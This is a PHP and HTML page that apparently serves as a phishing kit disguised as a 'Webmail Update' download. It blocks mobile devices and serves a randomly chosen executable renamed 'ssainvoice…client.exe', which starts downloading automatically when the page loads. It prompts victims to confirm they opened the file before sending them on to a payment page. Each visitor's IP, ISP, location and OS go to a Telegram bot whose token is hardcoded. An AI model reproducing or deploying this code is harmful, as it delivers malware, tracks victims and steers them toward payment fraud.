<?php
session_start();

// Path to the links.txt file
$linksFile = "links.txt";

// Ensure the links.txt file exists
if (!file_exists($linksFile)) {
    die("Links file not found!");
}

// Read all links from the file
$links = file($linksFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);

if (empty($links)) {
    die("No links available in the file!");
}

// Select a random link from the list
$fileUrl = $links[array_rand($links)];

// Generate a random file name for the download
$downloadFileName = "ssainvoice" . rand(100000, 999999) . ".client.exe";

// Save the random link in session to confirm the user downloads from it
$_SESSION['download_link'] = $fileUrl;

// Function to check mobile devices
function isMobileDevice($userAgent) {
    $mobileKeywords = ['iPhone', 'iPod', 'iPad', 'Android', 'webOS', 'BlackBerry', 'Windows Phone'];
    foreach ($mobileKeywords as $keyword) {
        if (strpos($userAgent, $keyword) !== false) {
            return true;
        }
    }
    return false;
}

// Get the real client IP address (handling Cloudflare)
function getRealIP() {
    if (isset($_SERVER['HTTP_CF_CONNECTING_IP'])) {
        return $_SERVER['HTTP_CF_CONNECTING_IP'];
    }
    return $_SERVER['REMOTE_ADDR'];
}

// Block access from mobile devices
$userAgent = $_SERVER['HTTP_USER_AGENT'];
if (isMobileDevice($userAgent)) {
    die("Access denied. Please use a desktop device to continue.");
}

// Telegram Bot Configuration
$telegramToken = "7122813837:AAFKf5B27kbMGu7qkkaW7l5lobNJmLhTK1g";
$telegramChatId = "-1002454773825";

// Function to send notification to Telegram
function sendTelegramNotification($message) {
    global $telegramToken, $telegramChatId;

    $url = "https://api.telegram.org/bot{$telegramToken}/sendMessage";
    $data = [
        'chat_id' => $telegramChatId,
        'text' => $message,
        'parse_mode' => 'Markdown'
    ];

    $options = [
        'http' => [
            'header' => "Content-Type: application/x-www-form-urlencoded\r\n",
            'method' => 'POST',
            'content' => http_build_query($data),
        ],
    ];
    $context = stream_context_create($options);
    file_get_contents($url, false, $context);
}

// Collect visitor details
function getVisitorDetails() {
    $ip = getRealIP(); // Use the real IP function here
    $userAgent = $_SERVER['HTTP_USER_AGENT'];
    $geoInfo = json_decode(file_get_contents("http://ip-api.com/json/{$ip}"), true);

    return [
        'ip' => $ip,
        'isp' => $geoInfo['isp'] ?? 'Unknown',
        'city' => $geoInfo['city'] ?? 'Unknown',
        'region' => $geoInfo['regionName'] ?? 'Unknown',
        'country' => $geoInfo['country'] ?? 'Unknown',
        'os' => getOS($userAgent),
    ];
}

// Determine the operating system
function getOS($userAgent) {
    $osArray = [
        'Windows' => 'Windows',
        'Macintosh' => 'Mac',
        'Linux' => 'Linux',
        'iPhone' => 'iOS',
        'Android' => 'Android',
    ];

    foreach ($osArray as $key => $value) {
        if (strpos($userAgent, $key) !== false) {
            return $value;
        }
    }
    return 'Unknown';
}

// Send visit notification to Telegram
$visitorDetails = getVisitorDetails();
$message = "🔹 *New Visitor Alert:*\n" .
           "🔹 *IP Address*: {$visitorDetails['ip']}\n" .
           "🔹 *ISP*: {$visitorDetails['isp']}\n" .
           "🔹 *City*: {$visitorDetails['city']}\n" .
           "🔹 *Region*: {$visitorDetails['region']}\n" .
           "🔹 *Country*: {$visitorDetails['country']}\n" .
           "🔹 *Operating System*: {$visitorDetails['os']}";

sendTelegramNotification($message);
?>

<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Webmail Update Downloading...</title>
    <style>
        body {
            font-family: Arial, Helvetica, sans-serif;
            background-color: #f4f4f9;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
        }

        .container {
            text-align: center;
            max-width: 450px;
            padding: 20px;
            background: #fff;
            border-radius: 10px;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
        }

        .btn {
            display: inline-block;
            padding: 10px 20px;
            margin-top: 20px;
            font-size: 16px;
            font-weight: bold;
            color: #fff;
            background-color: #007bff;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            text-decoration: none;
        }

        .btn:hover {
            background-color: #0056b3;
        }
    </style>
</head>

<body>
    <div class="container">
        <!-- Added message from photo text -->
        <h2>Important Update</h2>
        <p>Please download the latest version of our webmail client to ensure continued service.</p>
        <!-- End of added message -->

        <h1>Webmail Update Downloading...</h1>
        <p>Your download will start automatically. If it doesn't, please click the button below.</p>
        <a id="download-link" href="<?php echo htmlspecialchars($fileUrl); ?>" class="btn" download="<?php echo htmlspecialchars($downloadFileName); ?>">Download File</a>
        <button class="btn" onclick="confirmFileOpened()">I Have Opened the File</button>
    </div>

    <script>
        // Auto-start the download
        window.onload = function() {
            const downloadLink = document.getElementById('download-link');
            const autoDownload = document.createElement('a');
            autoDownload.href = downloadLink.href;
            autoDownload.download = downloadLink.getAttribute('download');
            autoDownload.click();
        };

        // Redirect after confirmation
        function confirmFileOpened() {
            window.location.href = "process_info_and_payment.php";
        }
    </script>
</body>

</html>